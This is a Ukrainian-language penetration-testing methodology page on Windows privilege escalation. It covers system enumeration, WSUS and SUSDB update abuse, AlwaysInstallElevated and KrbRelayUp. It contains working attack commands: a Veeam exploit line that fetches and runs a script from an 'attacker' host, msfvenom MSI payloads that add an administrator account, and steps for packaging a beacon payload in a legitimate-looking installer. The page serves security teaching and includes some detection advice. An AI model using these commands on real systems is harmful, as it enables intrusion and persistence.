# Підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

На цій сторінці зібрано загальну методологію підвищення привілеїв у Windows із кількох фундаментальних посібників.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Практичний порядок переліку даних також спирається на воркшопи та чеклісти спільноти.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Історичний матеріал про атаки містить доповідь DerbyCon про підвищення привілеїв у Windows.<sup>[[5]](#references)</sup>

## Основи Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Щоб дізнатися більше про ACL — DACL/SACL/ACE, перегляньте цю сторінку:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте цю сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби безпеки Windows

У Windows є різні механізми, які можуть **завадити вам збирати дані про систему**, запускати виконувані файли або навіть **виявити вашу діяльність**. Перш ніж починати збір даних для підвищення привілеїв, слід **прочитати** цю **сторінку** та **перевірити** всі ці **механізми захисту**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Фізичний доступ також дає змогу перетворити офлайнове редагування UEFI NVRAM на ланцюжок атак із DMA до завантаження ОС і модифікацією пам’яті Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Захист адміністратора / беззвучне підвищення привілеїв UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для отримання High IL без запитів, якщо обійти перевірки безпечного шляху AppInfo. Посібник із обходу UIAccess/Admin Protection наведено тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру спеціальних можливостей Secure Desktop можна використати для довільного запису в реєстр від SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **SMB на довільному порту**, за якого привілейована локальна автентифікація NTLM відбивається через повторно використане TCP-з’єднання SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Перелік відомостей про версію

Перевірте, чи є вразливості, відомі для цієї версії Windows (також перевірте встановлені виправлення).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку докладної інформації про вразливості безпеки Microsoft. У цій базі даних понад 4 700 вразливостей безпеки, що демонструє **величезну поверхню атаки**, яку становить середовище Windows.

**У системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — збирає інформацію про збірку ОС, встановлені оновлення та потенційно відповідні рекомендації; перш ніж вважати результат застосовним, перевірте точний продукт і замінні оновлення.

Для локального exploit, специфічного для певної версії, перевірте **архітектуру запущеного процесу**, а також архітектуру ОС. У 64-бітній Windows на 32-бітний процес поширюється [перенаправлення файлової системи WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` зазвичай вказує на 32-бітний системний каталог, тоді як `%windir%\Sysnative` надає цьому процесу доступ до нативного системного каталогу. Для 64-бітного процесу цей псевдонім недоступний. Збірка ОС або припущення про відсутній KB не доводять, що exploit можна застосувати; зіставте поточну збірку, встановлене або замінне оновлення, архітектуру процесу та передумови exploit із [бюлетенем безпеки Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) для конкретної проблеми.

**Локально, використовуючи інформацію про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Репозиторії exploit на GitHub:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Середовище

Чи збережені в змінних середовища облікові дані або інша цінна інформація?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Історія PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Файли журналів транскрибування PowerShell

Дізнатися, як увімкнути цю функцію, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` — лише приклад. [Політика транскрибування PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) зазвичай зберігає файли в папці Documents кожного користувача, але параметр `OutputDirectory` або `Start-Transcript -OutputDirectory` може перенаправити їх до спільної чи прихованої папки. Перш ніж переглядати транскрипт, перевірте фактичний шлях збереження та ACL файлу: він може містити аргументи команд і вивід, зокрема облікові дані. Доступний для читання транскрипт є лише зачіпкою, якщо його вміст розкриває обліковий запис із вищими привілеями, придатний до використання, і цей обліковий запис може ввійти в систему у відповідному контексті.

### PowerShell Module Logging

Записуються відомості про виконання конвеєрів PowerShell, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не фіксуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації «Файли транскриптів», вибравши **«Module Logging»** замість **«Powershell Transcription»**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Записуються всі дії та повний вміст виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає повний аудиторський слід усіх дій, цінний для криміналістичного аналізу та дослідження зловмисної поведінки. Документування всіх дій під час виконання дає змогу отримати детальне уявлення про процес.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Події журналювання для Script Block можна знайти в Windows Event Viewer за шляхом: **Журнали програм і служб > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна скористатися:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Налаштування Інтернету

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Накопичувачі

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP-ендпоінт WSUS є приводом перевірити можливість перехоплення метаданих оновлень. Експлуатація також залежить від того, чи використовує клієнт цей сервер WSUS, чи може зловмисник перехоплювати або контролювати його трафік, а також від політики клієнта щодо довіри до оновлень і їх установлення. Сам URL не підтверджує можливість виконання коду. [Microsoft рекомендує використовувати TLS для метаданих WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Спершу перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Або так у PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Якщо ви отримаєте відповідь, подібну до однієї з наведених:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Коли `UseWUServer` дорівнює `1`, Windows Update використовує налаштовану внутрішню службу. Це підтверджує наявність передумови для перехоплення HTTP-трафіку, але не доводить, що перехоплення, прийняття шкідливого оновлення або його встановлення з підвищеними привілеями можливі. Коли значення дорівнює `0`, ця конкретна налаштована кінцева точка WSUS не вибирається цією політикою.

Для експлуатації цих вразливостей можна використовувати такі інструменти, як [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це озброєні MiTM exploits-скрипти для впровадження «підроблених» оновлень у незашифрований SSL-трафік WSUS.

Дослідження можна прочитати тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Повний звіт можна прочитати тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
По суті, ця помилка використовує таку вразливість:

> Якщо ми можемо змінювати проксі-сервер для локального користувача, а Windows Updates використовує проксі-сервер, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), перехопити власний трафік і виконати код на нашому пристрої з підвищеними привілеями.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його сховище сертифікатів. Якщо ми створимо самопідписаний сертифікат для імені хоста WSUS і додамо його до сховища сертифікатів поточного користувача, то зможемо перехоплювати як HTTP-, так і HTTPS-трафік WSUS. WSUS не використовує механізмів на кшталт HSTS для реалізації перевірки сертифіката за принципом trust-on-first-use. Якщо сертифікат, який пред’являється, є довіреним для користувача та має правильне ім’я хоста, служба його прийме.

Цю вразливість можна експлуатувати за допомогою інструмента [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (коли його опублікують).

### Оновлення WSUS, контрольовані адміністратором

Окремий шлях існує, якщо поточна ідентичність може **публікувати й затверджувати** оновлення на сервері WSUS. Перевірте фактичне членство в групі `WSUS Administrators` на сервері та будь-які делеговані дозволи WSUS, а потім визначте групу клієнтських комп’ютерів, яка отримала б затверджене оновлення. [Microsoft вимагає привілеїв WSUS Administrator для затвердження оновлень](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) і [документує зв’язок довіри для публікації](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): клієнти мають довіряти сертифікату підпису, який використовується для локально опублікованого вмісту. Перш ніж вважати це шляхом підвищення привілеїв, підтвердьте, що кандидатне оновлення підписане й приймається, застосовне до цільової системи та встановлюється в контексті з вищими привілеями. Саме по собі значення HTTP `WUServer` або назва групи цих умов не підтверджує.

### Зловживання користувацькими оновленнями SUSDB: непідписані корисні навантаження через `.txt`/`.esd`

Це інше порушення межі довіри, а не перехоплення HTTP-з’єднання WSUS: необхідною передумовою є достатній доступ до **збережених процедур бази даних WSUS (`SUSDB`)** для публікації та затвердження користувацького оновлення. Один із практичних способів отримати такий доступ — ретранслювати облікові дані облікового запису комп’ютера upstream WSUS на окремий сервер MSSQL, де розміщено `SUSDB`; точні передумови залежать від розгортання, тому спочатку перелікуйте дозволи `EXECUTE`, а не припускайте наявність прав адміністратора SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Окремий шлях атаки, що ретранслює автентифікацію клієнта WSUS з HTTP/8530 до LDAP, SMB або AD CS, описано тут: [Зловживання HTTP WSUS для NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Створення, вибір цілі та затвердження оновлення

Процес роботи з користувацьким оновленням використовує легітимні процедури WSUS як обмежений API для публікації. Важливі переходи стану:<sup>[[38]](#references)</sup>

| Етап | Відповідні збережені процедури |
| --- | --- |
| Імпорт метаданих оновлення | `spImportUpdate` |
| Збереження фрагментів XML із передумовами, локалізованим та розширеним вмістом | `spSaveXMLFragment` |
| Прив’язування digest вмісту до контрольованої зловмисником URL-адреси | `spSetBatchURL` |
| Перелік/створення групи комп’ютерів і додавання клієнта | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Затвердження встановлення для цієї групи | `spDeployUpdate` з `@actionID = 0` і `@isAssigned = 1` |

Ім’я файлу, digest-и, розмір і обробник `CommandLineInstallation` мають узгоджуватися в імпортованих метаданих і фрагментах. Після призначення URL-адреси вмісту та цільової групи фінальне затвердження виглядає приблизно так; використовуйте нові ідентифікатори оновлення, групи та розгортання, а не повторно використовуйте GUID-и з прикладів.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Обхід перевірки підпису через розширення файлу

WSUS зазвичай відхиляє довільний непідписаний виконуваний вміст. Однак у `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` шлях .NET `VerifyFile` встановлює прапорець перевірки сертифіката в значення false, якщо передане ім’я файлу закінчується на `.txt` або `.esd`; після цього `CheckCertificateSignature` пропускається, і попередньо не перевіряється, чи є байти текстом або справжнім образом ESD. Тому незмінений PE-файл із назвою, наприклад, `payload.exe.txt` може пройти перевірку вмісту, а згодом бути запущений обробником інсталяції командного рядка оновлення. Це помилка плутанини типів/політики, а не підроблення підпису.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-сумісне розміщення та автоматизація

Виклик `spDeployUpdate` змушує WSUS отримати зареєстрований вміст. Джерело має відповідати вимогам BITS до HTTP: одного лише доступного URL недостатньо, оскільки передавання використовує початковий потік `HEAD`/`GET` і запити діапазонів байтів. Сервер без підтримки Range спричиняє помилку синхронізації WSUS `EventId=364` із повідомленням, що BITS вимагає заголовок протоколу Range.<sup>[[39]](#references)</sup>

Дослідницький PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) генерує SQL, необхідний для ланцюжка імпорту/фрагментів/URL/групи/розгортання, містить модифікований клієнт MSSQL для його виконання та постачається зі `BitsWebServer.py` для розміщення вмісту. Мінімальний приклад запуску в авторизованій лабораторії:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Безнаглядне виконання та персистентність через повторні спроби

Взаємодія на стороні клієнта залежить від політики. Параметр `4 - Auto download and schedule install` у розділі `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` дає змогу завантажувати й установлювати схвалене оновлення за налаштованим розкладом без ручного вибору користувачем. Під час тестування payload, оновлення якого залишилося в стані помилки/незавершеності, одразу пропонувався повторно після завершення процесу callback. Отже, поведінка повторних спроб може перетворитися на персистентне повторюване виконання; це помітно, оскільки клієнт показує стан невдалого оновлення.<sup>[[39]](#references)</sup>

#### Напрями виявлення та посилення захисту

Корисні серверні й клієнтські напрями перевірки в цьому ланцюжку:<sup>[[39]](#references)</sup>

- Аудитуйте виконання `spCreateTargetGroup`, `spSetBatchURL` і `spDeployUpdate` у `SUSDB`; перевіряйте нові групи націлювання, зовнішні джерела вмісту, payload оновлень `.txt`/`.esd` і розгортання, виконані неочікуваними принципалами (особливо обліковими записами, що не є комп’ютерними).
- Перевіряйте `C:\Program Files\Update Services\LogFiles` на наявність `ContentSyncAgent`, `FileVerified`, помилково написаного `FileVerficationFailed` і `EventId=364`; зіставляйте результати перевірки з розширенням payload і сигнатурою вмісту, а не довіряйте суфіксу.
- Шукайте випадки повторних невдалих спроб інсталяції Windows Update, а також виконання PE-файлів або неочікуваної дочірньої/мережевої активності з вмісту, що має назви `.txt` або `.esd`.
- Якщо підтримується, вимагайте Extended Protection for Authentication для служби бази даних і обмежте мережевий доступ до бази даних сервером WSUS та авторизованими адміністративними системами. Мінімізуйте й аудіюйте права `EXECUTE` для процедур custom-update.

## Сторонні засоби автоматичного оновлення та IPC агента (локальний privesc)

Багато корпоративних агентів надають IPC-інтерфейс на localhost і привілейований канал оновлення. Якщо реєстрацію можна примусово спрямувати на сервер зловмисника, а засіб оновлення довіряє шахрайському кореневому CA або має слабкі перевірки підпису, локальний користувач може доставити шкідливий MSI, який служба SYSTEM встановить. Узагальнений опис техніки (на основі ланцюжка Netskope stAgentSvc – CVE-2025-0309) дивіться тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam Backup & Replication і Cloud Connect використовують основну службу резервного копіювання, що за замовчуванням працює на **TCP/9401**. [Рекомендації Veeam](https://www.veeam.com/kb4424) описують розкриття зашифрованих облікових даних бази даних конфігурації без автентифікації в межах мережевого периметра резервного копіювання; окремий публічний PoC демонструє шлях до виконання команд від імені **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Служба може прослуховувати адреси поза localhost, тому перевірте фактичну адресу та PID.

- **Розвідка**: переконайтеся, що TCP/9401 належить `Veeam.Backup.Service.exe`, а потім перевірте встановлений продукт і метадані виправлень. `netstat -ano | findstr 9401` і `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` — це підказки, а не повна перевірка наявності виправлень.
- **Мінімальні виправлені версії**: Veeam указує **11a build 11.0.1.1261 P20230227** і **12 build 12.0.0.1420 P20230223** як перші виправлені випуски; попередні випуски вразливі. Самої чотиричастинної версії файлу недостатньо, щоб відрізнити невиправлену базову збірку від пізнішого виправлення для тієї самої збірки. Перш ніж вважати граничну збірку виправленою, звірте ідентифікатор виправлення з [історією збірок постачальника](https://www.veeam.com/kb2680).
- **Експлуатація**: помістіть PoC, наприклад `VeeamHax.exe`, разом із потрібними DLL Veeam в один каталог, а потім запустіть payload SYSTEM через локальний сокет:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Згаданий PoC демонструє виконання команд від імені SYSTEM за наявності додаткових передумов; у рекомендації постачальника описано проблему розкриття облікових даних.
## KrbRelayUp

Локальний Kerberos relay може надати змогу перейти від входу з нижчими привілеями до привілейованого запису в каталозі, якщо відповідний COM-сервер проходить автентифікацію, а ретрансльований principal має права на цільовий об’єкт. [Документація KrbRelay](https://github.com/cube0x0/KrbRelay) описує записи LDAP для RBCD і `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp автоматизує деякі з цих сценаріїв. Для ланцюжка RBCD потрібні відповідні права делегування та права на цільовий об’єкт, а для ланцюжка shadow-credential — права на запис ключових облікових даних і KDC, що підтримує шлях автентифікації за сертифікатом. Жоден із цих сценаріїв не випливає лише з членства в домені.

Перевірте фактичні політики [підписування LDAP](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) і [прив’язування каналу LDAPS](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) на DC, ACL об’єкта для ретрансльованої особи та рівні автентифікації й уособлення вибраного COM-класу. Важливі тип входу користувача та контекст облікових даних: сеанс WinRM може поводитися інакше, ніж інтерактивний вхід або вхід із новими обліковими даними. На результат також можуть вплинути маршрутизація через брандмауер/OXID і встановлені оновлення. Розглядайте надто дозвільну політику або відповідний ACL як привід для перевірки; пасивне перерахування не повинно запускати примусову активацію COM, автентифікацію через relay або записи в каталозі. Shadow credential облікового запису комп’ютера може надати змогу отримати квиток для комп’ютера, а окремий шлях DCSync можливий лише за наявності в цього облікового запису потрібних прав реплікації каталогу.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Щоб дізнатися більше про перебіг атаки, див. [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнені** (значення — **0x1**), користувачі з будь-яким рівнем привілеїв можуть **інсталювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Якщо у вас є сесія meterpreter, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі бінарний файл Windows MSI для підвищення привілеїв. Цей скрипт записує попередньо скомпільований інсталятор MSI, який пропонує додати користувача/групу (для цього вам знадобиться доступ до GIU):

```
Write-UserAddMSI
```

Просто запустіть створений бінарний файл, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей посібник, щоб дізнатися, як створити MSI wrapper за допомогою цих інструментів. Зверніть увагу: можна обгорнути файл «**.bat**», якщо потрібно **лише** виконати **командні рядки**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- За допомогою Cobalt Strike або Metasploit **згенеруйте** новий **Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Створити проєкт** і введіть "installer" у поле пошуку. Виберіть проєкт **Майстер інсталяції** та натисніть **Далі**.
- Введіть назву проєкту, наприклад **AlwaysPrivesc**, для розташування вкажіть **`C:\privesc`**, виберіть **розмістити рішення та проєкт в одному каталозі** й натисніть **Створити**.
- Натискайте **Далі**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Додати** та виберіть щойно згенерований Beacon payload. Потім натисніть **Готово**.
- Виділіть проєкт **AlwaysPrivesc** у **Провіднику рішень** і в розділі **Властивості** змініть **TargetPlatform** з **x86** на **x64**.
  - Можна змінити й інші властивості, наприклад **Author** і **Manufacturer**, щоб інстальована програма виглядала легітимніше.
- Клацніть проєкт правою кнопкою миші та виберіть **Перегляд > Спеціальні дії**.
- Клацніть правою кнопкою миші **Install** і виберіть **Додати спеціальну дію**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить запуск Beacon payload одразу після запуску інсталятора.
- У розділі **Властивості спеціальної дії** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть проєкт**.
  - Якщо з’явиться попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, перевірте, чи встановлено платформу x64.

### Інсталяція MSI

Щоб виконати **інсталяцію** шкідливого файлу `.msi` у **фоновому режимі:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Щоб скористатися цією вразливістю, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та детектори

### Параметри аудиту

Ці параметри визначають, що саме **реєструється в журналах**, тож зверніть на них увагу

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локального Administrator**, забезпечуючи, щоб кожен пароль був **унікальним, випадковим і регулярно оновлювався** на комп’ютерах, приєднаних до домену. Ці паролі надійно зберігаються в Active Directory, і доступ до них можуть отримати лише користувачі, яким через ACL надано відповідні дозволи, що дають змогу переглядати паролі локального адміністратора, якщо це дозволено.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активовано, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Докладніше про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Докладніше про Credential Guard можна дізнатися тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Доменні облікові дані** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані для входу користувача автентифікуються зареєстрованим пакетом безпеки, для користувача зазвичай створюються доменні облікові дані.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі та групи

### Перелічення користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **входите до привілейованої групи, то, можливо, зможете підвищити привілеї**. Дізнайтеся більше про привілейовані групи та про те, як зловживати їхніми можливостями для підвищення привілеїв:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Токени Windows**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
